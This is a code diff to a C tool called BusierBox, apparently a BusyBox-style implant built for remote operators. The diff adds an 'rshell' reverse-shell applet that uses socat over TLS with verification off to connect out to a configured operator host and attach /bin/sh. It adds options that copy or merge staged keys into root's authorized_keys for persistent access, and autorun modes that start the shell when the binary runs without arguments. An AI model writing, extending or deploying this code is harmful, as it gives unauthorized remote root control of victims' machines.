@@ -18,6 +18,9 @@
 #define PATH_MAX 4096
 #endif
 
+#ifndef BB_RUNTIME_MODE
+#define BB_RUNTIME_MODE "extract"
+#endif
 #ifndef BB_ENABLE_SURVEY
 #define BB_ENABLE_SURVEY 1
 #endif
@@ -33,26 +36,41 @@
 #ifndef BB_ENABLE_FETCH_FULL
 #define BB_ENABLE_FETCH_FULL 1
 #endif
-#ifndef BB_ENABLE_CALLBACK
-#define BB_ENABLE_CALLBACK 1
-#endif
 #ifndef BUSIERBOX_ARTIFACT_TIER
 #define BUSIERBOX_ARTIFACT_TIER "full"
 #endif
 #ifndef BB_ARTIFACT_KIND
 #define BB_ARTIFACT_KIND BUSIERBOX_ARTIFACT_TIER
 #endif
-#ifndef BB_STAGER_ZERO_ARG_MODE
-#define BB_STAGER_ZERO_ARG_MODE "help"
-#endif
 #ifndef BB_FULL_ZERO_ARG_MODE
 #define BB_FULL_ZERO_ARG_MODE "help"
+#endif
+#ifndef BB_ZERO_ARG_MODE
+#define BB_ZERO_ARG_MODE BB_FULL_ZERO_ARG_MODE
+#endif
+#ifndef BB_ZERO_ARG_LOG_MODE
+#define BB_ZERO_ARG_LOG_MODE "quiet"
 #endif
 #ifndef BB_ZERO_ARG_CUSTOM_COMMAND
 #define BB_ZERO_ARG_CUSTOM_COMMAND ""
 #endif
 #ifndef BB_RSHELL_MODE
 #define BB_RSHELL_MODE "ssh"
+#endif
+#ifndef BB_RSHELL_TRANSPORT
+#define BB_RSHELL_TRANSPORT BB_RSHELL_MODE
+#endif
+#ifndef BB_RSHELL_AUTHKEYS_MODE
+#define BB_RSHELL_AUTHKEYS_MODE "disabled"
+#endif
+#ifndef BB_RSHELL_GENERATE_HOSTKEY_IF_MISSING
+#define BB_RSHELL_GENERATE_HOSTKEY_IF_MISSING "no"
+#endif
+#ifndef BB_RSHELL_SOCAT_PORT
+#define BB_RSHELL_SOCAT_PORT "22203"
+#endif
+#ifndef BB_BUILTIN_TLS_ENABLE
+#define BB_BUILTIN_TLS_ENABLE "no"
 #endif
 #ifndef BB_AUTORUN_GUARD_ENABLE
 #define BB_AUTORUN_GUARD_ENABLE "yes"
@@ -106,9 +124,6 @@ const struct bb_applet bb_applets[] = {
 #endif
 #if BB_ENABLE_FETCH_FULL
     {"fetch-full", applet_fetch_full_main, "download a full BusierBox artifact"},
-#endif
-#if BB_ENABLE_CALLBACK
-    {"callback", applet_callback_main, "call back to operator station using stager protocol"},
 #endif
     {"rshell", applet_rshell_main, "start configured reverse shell transport"},
 };
@@ -219,7 +234,7 @@ static int reentry_action(void)
 
 static int guard_needed(const char *mode)
 {
-    return !strcmp(mode, "callback") || !strcmp(mode, "shell") || !strcmp(mode, "custom");
+    return !strcmp(mode, "rshell") || !strcmp(mode, "custom") || !strcmp(mode, "shell");
 }
 
 static int acquire_autorun_guard(const char *mode)
@@ -300,35 +315,136 @@ static int path_exec(const char *path)
 
 int applet_rshell_main(int argc, char **argv)
 {
-    char payload[PATH_MAX], dropbear[PATH_MAX], dbclient[PATH_MAX], dropbearkey[PATH_MAX];
+    char payload[PATH_MAX], dropbear[PATH_MAX], dbclient[PATH_MAX], dropbearkey[PATH_MAX], socat[PATH_MAX];
     char hostkey[PATH_MAX], identity[PATH_MAX], authkeys[PATH_MAX], rootssh[PATH_MAX];
     char cmd[8192] = "";
+    const char *subcmd = "start";
+    const char *transport = BB_RSHELL_TRANSPORT;
+    int i;
     int rc;
 
     if (argc > 1 && (!strcmp(argv[1], "--help") || !strcmp(argv[1], "-h"))) {
-        puts("usage: busierbox rshell");
-        puts("Starts the configured reverse shell transport. Current transport: ssh/dropbear/dbclient.");
+        puts("usage: busierbox rshell [start|status|stop|restart] [--transport ssh|socat-tls|builtin-tls]");
+        puts("Starts or manages the configured reverse access transport.");
+#ifdef HAVE_WOLFSSL
+        puts("Implemented transports: ssh (Dropbear/dbclient), socat-tls (payload socat), builtin-tls (wolfSSL core).");
+#else
+        puts("Implemented transports: ssh (Dropbear/dbclient), socat-tls (payload socat).");
+        puts("builtin-tls is available when rebuilt with BB_BUILTIN_TLS_ENABLE=yes and wolfSSL installed.");
+#endif
         return 0;
     }
-    if (strcmp(BB_RSHELL_MODE, "ssh")) {
-        fprintf(stderr, "rshell: unsupported transport '%s'\n", BB_RSHELL_MODE);
+    if (argc > 1 && argv[1][0] != '-')
+        subcmd = argv[1];
+    for (i = 1; i < argc; i++) {
+        if (!strcmp(argv[i], "--transport") && i + 1 < argc) {
+            transport = argv[++i];
+        } else if (!strncmp(argv[i], "--transport=", 12)) {
+            transport = argv[i] + 12;
+        }
+    }
+
+    if (!strcmp(subcmd, "status")) {
+        const char *guard = autorun_guard_path();
+        char status_path[PATH_MAX], lock_path[PATH_MAX];
+        snprintf(status_path, sizeof(status_path), "%s/rshell.status", guard);
+        snprintf(lock_path, sizeof(lock_path), "%s/rshell.lock", guard);
+        if (access(status_path, R_OK) == 0) {
+            char buf[512];
+            FILE *fp = fopen(status_path, "r");
+            while (fp && fgets(buf, sizeof(buf), fp))
+                fputs(buf, stdout);
+            if (fp)
+                fclose(fp);
+            return 0;
+        }
+        if (access(lock_path, R_OK) == 0) {
+            puts("rshell_status=possibly-active");
+            printf("rshell_guard=%s\n", guard);
+            return 0;
+        }
+        puts("rshell_status=inactive");
+        printf("rshell_guard=%s\n", guard);
+        return 0;
+    }
+    if (!strcmp(subcmd, "stop")) {
+        const char *guard = autorun_guard_path();
+        char lock_path[PATH_MAX], status_path[PATH_MAX];
+        snprintf(lock_path, sizeof(lock_path), "%s/rshell.lock", guard);
+        snprintf(status_path, sizeof(status_path), "%s/rshell.status", guard);
+        unlink(lock_path);
+        unlink(status_path);
+        puts("rshell_stopped=best-effort");
+        return 0;
+    }
+    if (!strcmp(subcmd, "restart")) {
+        const char *guard = autorun_guard_path();
+        char lock_path[PATH_MAX], status_path[PATH_MAX];
+        snprintf(lock_path, sizeof(lock_path), "%s/rshell.lock", guard);
+        snprintf(status_path, sizeof(status_path), "%s/rshell.status", guard);
+        unlink(lock_path);
+        unlink(status_path);
+        subcmd = "start";
+    }
+    if (strcmp(subcmd, "start")) {
+        fprintf(stderr, "rshell: unknown subcommand '%s'\n", subcmd);
         return 2;
+    }
+
+    if (!strcmp(transport, "builtin-tls")) {
+#ifdef HAVE_WOLFSSL
+        return rshell_builtin_tls(BB_OPERATOR_SERVER_HOST, BB_RSHELL_SOCAT_PORT);
+#else
+        fputs("rshell: builtin-tls requires wolfSSL; rebuild with BB_BUILTIN_TLS_ENABLE=yes\n", stderr);
+        return 2;
+#endif
+    }
+    if (strcmp(transport, "ssh") && strcmp(transport, "socat-tls")) {
+        fprintf(stderr, "rshell: unsupported transport '%s'\n", transport);
+        return 2;
+    }
+    if (!strcmp(BB_RUNTIME_MODE, "core-only")) {
+        fprintf(stderr, "rshell: transport '%s' requires staged payload tools but this artifact uses core-only runtime mode\n", transport);
+        fputs("rshell: change Runtime mode to 'extract' or 'no-residue' in menuconfig, then rebuild\n", stderr);
+#ifndef HAVE_WOLFSSL
+        fputs("rshell: for a no-extraction shell, rebuild with BB_BUILTIN_TLS_ENABLE=yes (requires wolfSSL) and transport=builtin-tls\n", stderr);
+#endif
+        return 127;
     }
     if (!BB_OPERATOR_SERVER_HOST[0]) {
         fputs("rshell: operator host is not configured; set it in menuconfig under Payload Options -> Applet configuration -> Reverse shell\n", stderr);
         return 2;
     }
     if (bb_ensure_payload_dir(payload, sizeof(payload)) != 0) {
-        fputs("rshell: payload unavailable; cannot start Dropbear/dbclient\n", stderr);
+        fputs("rshell: payload unavailable; cannot start reverse shell transport\n", stderr);
         return 127;
     }
     snprintf(dropbear, sizeof(dropbear), "%s/bin/dropbear", payload);
     snprintf(dbclient, sizeof(dbclient), "%s/bin/dbclient", payload);
     snprintf(dropbearkey, sizeof(dropbearkey), "%s/bin/dropbearkey", payload);
+    snprintf(socat, sizeof(socat), "%s/bin/socat", payload);
     snprintf(hostkey, sizeof(hostkey), "%s/etc/dropbear/dropbear_rsa_host_key", payload);
     snprintf(identity, sizeof(identity), "%s/home/.ssh/id_dbclient", payload);
     snprintf(authkeys, sizeof(authkeys), "%s/home/.ssh/authorized_keys", payload);
     snprintf(rootssh, sizeof(rootssh), "%s", "/root/.ssh");
+
+    if (!strcmp(transport, "socat-tls")) {
+        if (!path_exec(socat)) {
+            fputs("rshell: socat-tls transport requires staged socat; enable socat in Heavy tools and rebuild\n", stderr);
+            return 127;
+        }
+        strcat(cmd, "exec ");
+        shquote_append(cmd, sizeof(cmd), socat);
+        strcat(cmd, " OPENSSL:");
+        shquote_append(cmd, sizeof(cmd), BB_OPERATOR_SERVER_HOST ":" BB_RSHELL_SOCAT_PORT ",verify=0");
+        strcat(cmd, " EXEC:/bin/sh,pty,stderr,setsid,sigint,sane");
+        rc = system(cmd);
+        if (rc == -1)
+            return 1;
+        if (WIFEXITED(rc))
+            return WEXITSTATUS(rc);
+        return 1;
+    }
 
     if (!path_exec(dropbear) || !path_exec(dbclient)) {
         fputs("rshell: dropbear/dbclient are not staged; enable dropbear in Heavy tools and rebuild\n", stderr);
@@ -355,20 +471,33 @@ int applet_rshell_main(int argc, char **argv)
     strcat(cmd, "$(dirname ");
     shquote_append(cmd, sizeof(cmd), hostkey);
     strcat(cmd, "); ");
-    strcat(cmd, "if [ -f ");
-    shquote_append(cmd, sizeof(cmd), authkeys);
-    strcat(cmd, " ]; then cat ");
-    shquote_append(cmd, sizeof(cmd), authkeys);
-    strcat(cmd, " >>/root/.ssh/authorized_keys 2>/dev/null || true; chmod 600 /root/.ssh/authorized_keys 2>/dev/null || true; fi; ");
+    if (!strcmp(BB_RSHELL_AUTHKEYS_MODE, "root-copy")) {
+        strcat(cmd, "if [ -f ");
+        shquote_append(cmd, sizeof(cmd), authkeys);
+        strcat(cmd, " ] && [ ! -f /root/.ssh/authorized_keys ]; then cp ");
+        shquote_append(cmd, sizeof(cmd), authkeys);
+        strcat(cmd, " /root/.ssh/authorized_keys 2>/dev/null || true; chmod 600 /root/.ssh/authorized_keys 2>/dev/null || true; fi; ");
+    } else if (!strcmp(BB_RSHELL_AUTHKEYS_MODE, "root-merge")) {
+        strcat(cmd, "if [ -f ");
+        shquote_append(cmd, sizeof(cmd), authkeys);
+        strcat(cmd, " ]; then tmp=/root/.ssh/authorized_keys.busierbox.$$; { sed '/^# BEGIN BUSIERBOX RSHELL$/,/^# END BUSIERBOX RSHELL$/d' /root/.ssh/authorized_keys 2>/dev/null || true; echo '# BEGIN BUSIERBOX RSHELL'; cat ");
+        shquote_append(cmd, sizeof(cmd), authkeys);
+        strcat(cmd, "; echo '# END BUSIERBOX RSHELL'; } >$tmp && mv $tmp /root/.ssh/authorized_keys 2>/dev/null || rm -f $tmp; chmod 600 /root/.ssh/authorized_keys 2>/dev/null || true; fi; ");
+    }
+    if (!strcmp(BB_RSHELL_GENERATE_HOSTKEY_IF_MISSING, "yes")) {
+        strcat(cmd, "if [ ! -f ");
+        shquote_append(cmd, sizeof(cmd), hostkey);
+        strcat(cmd, " ] && [ -x ");
+        shquote_append(cmd, sizeof(cmd), dropbearkey);
+        strcat(cmd, " ]; then ");
+        shquote_append(cmd, sizeof(cmd), dropbearkey);
+        strcat(cmd, " -t rsa -f ");
+        shquote_append(cmd, sizeof(cmd), hostkey);
+        strcat(cmd, " >/dev/null 2>&1 || true; fi; ");
+    }
     strcat(cmd, "if [ ! -f ");
     shquote_append(cmd, sizeof(cmd), hostkey);
-    strcat(cmd, " ] && [ -x ");
-    shquote_append(cmd, sizeof(cmd), dropbearkey);
-    strcat(cmd, " ]; then ");
-    shquote_append(cmd, sizeof(cmd), dropbearkey);
-    strcat(cmd, " -t rsa -f ");
-    shquote_append(cmd, sizeof(cmd), hostkey);
-    strcat(cmd, " >/dev/null 2>&1 || true; fi; ");
+    strcat(cmd, " ]; then echo 'rshell: missing Dropbear host key; enable pre-generated host key or allow runtime host-key generation' >&2; exit 2; fi; ");
     shquote_append(cmd, sizeof(cmd), dropbear);
     strcat(cmd, " -r ");
     shquote_append(cmd, sizeof(cmd), hostkey);
@@ -449,17 +578,17 @@ static int run_custom_zero_arg(void)
 
 static int run_zero_arg_mode(const char *mode)
 {
-    char *callback_argv[] = { "callback", NULL };
     char *rshell_argv[] = { "rshell", NULL };
+    char *survey_argv[] = { "survey", NULL };
 
     if (!mode || !*mode || !strcmp(mode, "help") || !strcmp(mode, "menu") ||
-        !strcmp(mode, "survey") || !strcmp(mode, "doctor")) {
+        !strcmp(mode, "doctor")) {
         usage(!mode || !*mode || !strcmp(mode, "help") ? stderr : stdout);
         return !mode || !*mode || !strcmp(mode, "help") ? 2 : 0;
     }
-    if (!strcmp(mode, "callback"))
-        return applet_callback_main(1, callback_argv);
-    if (!strcmp(mode, "shell") || !strcmp(mode, "bootstrap") || !strcmp(mode, "operator-session"))
+    if (!strcmp(mode, "survey"))
+        return applet_survey_main(1, survey_argv);
+    if (!strcmp(mode, "rshell"))
         return applet_rshell_main(1, rshell_argv);
     if (!strcmp(mode, "custom"))
         return run_custom_zero_arg();
@@ -472,10 +601,7 @@ static int zero_arg_main(void)
 {
     const char *mode = getenv("BUSIERBOX_ZERO_ARG_MODE");
     if (!mode || !*mode) {
-        if (!strcmp(BUSIERBOX_ARTIFACT_TIER, "stager"))
-            mode = BB_STAGER_ZERO_ARG_MODE;
-        else
-            mode = BB_FULL_ZERO_ARG_MODE;
+        mode = BB_ZERO_ARG_MODE;
     }
     if (getenv("BUSIERBOX_NO_AUTORUN") && !strcmp(getenv("BUSIERBOX_NO_AUTORUN"), "1")) {
         usage(stdout);
